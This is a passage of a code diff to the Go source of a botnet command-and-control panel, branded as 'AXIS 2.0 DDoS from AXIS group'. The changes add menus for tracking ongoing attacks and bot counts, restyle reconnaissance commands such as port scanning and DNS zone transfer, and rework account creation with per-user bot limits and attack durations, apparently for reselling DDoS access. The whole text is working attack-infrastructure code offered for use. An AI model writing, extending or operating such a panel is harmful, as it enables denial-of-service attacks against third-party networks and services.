-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m \033[01;36m══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;37m" + username + "!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont spam attacks! Dont share logins!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont attack government targets!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mAXIS 2.0 - Merged Edition\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mVersion\033[01;36m:\033[01;37m \033[01;37mv2.0\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;36m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;31m- Dont spam attacks!              \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;31m- Dont share logins!              \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;31m- Dont attack governments!        \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mVersion: \033[1;33mv2.0                  \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mMade by: \033[1;33mAXIS Group            \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+			this.conn.Write([]byte("\r\n"))
+			continue
+		}
+
+		// TOOLS command
+		if cmd == "TOOLS" || cmd == "tools" {
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/iplookup\x1b[1;37m    - Lookup IPv4 info      \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/portscan\x1b[1;37m    - Portscan an IP        \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/whois\x1b[1;37m       - WHOIS lookup          \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/ping\x1b[1;37m        - Ping an IP            \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/traceroute\x1b[1;37m  - Trace route to host   \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/resolve\x1b[1;37m     - Resolve hostname      \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+			this.conn.Write([]byte("\r\n"))
+			continue
+		}
+
+		// ONGOING command
+		if cmd == "ongoing" || cmd == "ong" || cmd == "ONG" || cmd == "LASTONG" || cmd == "lastong" || cmd == "LONG" || cmd == "LASTONGOING" || cmd == "lastongoing" || cmd == "LONGOING" || cmd == "longoing" || cmd == "long" || cmd == "ONGOING" {
+			this.conn.Write([]byte("\033[01;36m ╔════════════════════════════════════════════════╗\r\n"))
+			this.conn.Write([]byte("\033[01;36m ║\033[1;37mID     COMMAND                 DURATION     BOTS\033[01;36m║\r\n"))
+			this.conn.Write([]byte("\033[01;36m ╚════════════════════════════════════════════════╝\r\n"))
+			this.conn.Write([]byte(fmt.Sprintf("\033[01;32m  %d     %s   %d   %d\r\n", database.ongoingIds(), database.ongoingCommands(), database.ongoingDuration(), database.ongoingBots())))
 			continue
 		}
 
@@ -300,9 +395,9 @@ func (this *Admin) Handle() {
 			}
 		}
 
-		// Network tools - AXIS style
+		// Network tools - zinnet style
 		if cmd == "IPLOOKUP" || cmd == "iplookup" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -315,22 +410,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address Only!\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "PORTSCAN" || cmd == "portscan" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -343,22 +438,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address/Host Name Only!\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/WHOIS" || cmd == "/whois" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -371,22 +466,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/PING" || cmd == "/ping" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -399,22 +494,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResponse\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResponse\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/traceroute" || cmd == "/TRACEROUTE" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -427,22 +522,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mError... IP Address/Host Name Only!033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address/Host Name Only!\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResults\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/resolve" || cmd == "/RESOLVE" {
-			this.conn.Write([]byte("\x1b[1;32mURL (Without www.)\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mURL (Without www.)\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -455,22 +550,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address/Host Name Only!\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/reversedns" || cmd == "/REVERSEDNS" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -483,22 +578,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
-		if cmd == "/asnlookup" || cmd == "/asnlookup" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+		if cmd == "/asnlookup" || cmd == "/ASNLOOKUP" {
+			this.conn.Write([]byte("\033[01;37mIPv4 or ASN\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -511,22 +606,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/subnetcalc" || cmd == "/SUBNETCALC" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mCIDR or IP w/ Netmask\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -539,22 +634,22 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 
 		if cmd == "/zonetransfer" || cmd == "/ZONETRANSFER" {
-			this.conn.Write([]byte("\x1b[1;32mIPv4 Or Website (Without www.)\x1b[1;32m: \x1b[0m"))
+			this.conn.Write([]byte("\033[01;37mURL (without www.)\033[01;36m:\033[01;37m \033[1;33m"))
 			locipaddress, err := this.ReadLine(false)
 			if err != nil {
 				return
@@ -567,61 +662,61 @@ func (this *Admin) Handle() {
 			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
 			locresponse, err := client.Get(url)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
 			if err != nil {
-				this.conn.Write([]byte(fmt.Sprintf("\033[32mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
+				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
 				continue
 			}
 			locrespstring := string(locresponsedata)
 			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
-			this.conn.Write([]byte("\x1b[1;32mResult\x1b[1;32m: \r\n\x1b[1;32m" + locformatted + "\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[01;37mResult\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
 			continue
 		}
 	}
 }
 
 func (this *Admin) handleAddUser(isAdmin bool) {
-	this.conn.Write([]byte("\x1b[1;32mUsername:\x1b[0m "))
+	this.conn.Write([]byte("\033[01;37mUsername:\033[01;36m \033[1;33m"))
 	new_un, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
-	this.conn.Write([]byte("\x1b[1;32mPassword:\x1b[0m "))
+	this.conn.Write([]byte("\033[01;37mPassword:\033[01;36m \033[1;33m"))
 	new_pw, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
-	this.conn.Write([]byte("\x1b[1;32mBotcount (-1 for All):\x1b[0m "))
+	this.conn.Write([]byte("\033[01;37mBotcount (-1 for All):\033[01;36m \033[1;33m"))
 	max_bots_str, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
 	max_bots, err := strconv.Atoi(max_bots_str)
 	if err != nil {
-		this.conn.Write([]byte("\x1b[1;31mInvalid bot count\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;31mInvalid bot count\033[01;37m\r\n"))
 		return
 	}
-	this.conn.Write([]byte("\x1b[1;32mAttack Duration (-1 for Unlimited):\x1b[0m "))
+	this.conn.Write([]byte("\033[01;37mAttack Duration (-1 for Unlimited):\033[01;36m \033[1;33m"))
 	duration_str, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
 	duration, err := strconv.Atoi(duration_str)
 	if err != nil {
-		this.conn.Write([]byte("\x1b[1;31mInvalid duration\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;31mInvalid duration\033[01;37m\r\n"))
 		return
 	}
-	this.conn.Write([]byte("\x1b[1;32mCooldown (0 for No Cooldown):\x1b[0m "))
+	this.conn.Write([]byte("\033[01;37mCooldown (0 for No Cooldown):\033[01;36m \033[1;33m"))
 	cooldown_str, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
 	cooldown, err := strconv.Atoi(cooldown_str)
 	if err != nil {
-		this.conn.Write([]byte("\x1b[1;31mInvalid cooldown\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;31mInvalid cooldown\033[01;37m\r\n"))
 		return
 	}
 
@@ -633,41 +728,70 @@ func (this *Admin) handleAddUser(isAdmin bool) {
 	}
 
 	if success {
-		this.conn.Write([]byte("\x1b[1;32mUser created successfully!\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;32mUser created successfully!\033[01;37m\r\n"))
 	} else {
-		this.conn.Write([]byte("\x1b[1;31mFailed to create user (may already exist)\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;31mFailed to create user (may already exist)\033[01;37m\r\n"))
 	}
 }
 
 func (this *Admin) handleRemoveUser() {
-	this.conn.Write([]byte("\x1b[1;32mUsername to remove:\x1b[0m "))
+	this.conn.Write([]byte("\033[01;37mUsername to remove:\033[01;36m \033[1;33m"))
 	username, err := this.ReadLine(false)
 	if err != nil {
 		return
 	}
 	if database.RemoveUser(username) {
-		this.conn.Write([]byte("\x1b[1;32mUser removed\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;32mUser removed\033[01;37m\r\n"))
 	} else {
-		this.conn.Write([]byte("\x1b[1;31mUser not found\x1b[0m\r\n"))
+		this.conn.Write([]byte("\033[01;31mUser not found\033[01;37m\r\n"))
 	}
 }
 
-func (this *Admin) ReadLine(password bool) (string, error) {
-	buf := make([]byte, 1024)
+func (this *Admin) ReadLine(masked bool) (string, error) {
+	buf := make([]byte, 1000)
 	bufPos := 0
-
 	for {
+		if len(buf) < bufPos+2 {
+			fmt.Println("\x1b[1;37mOver Exceded Buf:", len(buf))
+			fmt.Println("\x1b[1;37mPrevented CNC Crash | IP:", this.conn.RemoteAddr())
+			return string(buf), nil
+		}
 		n, err := this.conn.Read(buf[bufPos : bufPos+1])
 		if err != nil || n != 1 {
 			return "", err
 		}
-		if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
+		if buf[bufPos] == '\xFF' {
+			n, err := this.conn.Read(buf[bufPos : bufPos+2])
+			if err != nil || n != 2 {
+				return "", err
+			}
+			bufPos--
+		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
+			if bufPos > 0 {
+				this.conn.Write([]byte(string(buf[bufPos])))
+				bufPos--
+			}
+			bufPos--
+		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
 			bufPos--
 		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
+			this.conn.Write([]byte("\r\n"))
 			return string(buf[:bufPos]), nil
-		}
-		if !password {
-			this.conn.Write(buf[bufPos : bufPos+1])
+		} else if buf[bufPos] == 0x03 {
+			this.conn.Write([]byte("^C\r\n"))
+			return "", nil
+		} else {
+			if buf[bufPos] == '\x1B' {
+				buf[bufPos] = '^'
+				this.conn.Write([]byte(string(buf[bufPos])))
+				bufPos++
+				buf[bufPos] = '['
+				this.conn.Write([]byte(string(buf[bufPos])))
+			} else if masked {
+				this.conn.Write([]byte("*"))
+			} else {
+				this.conn.Write([]byte(string(buf[bufPos])))
+			}
 		}
 		bufPos++
 	}
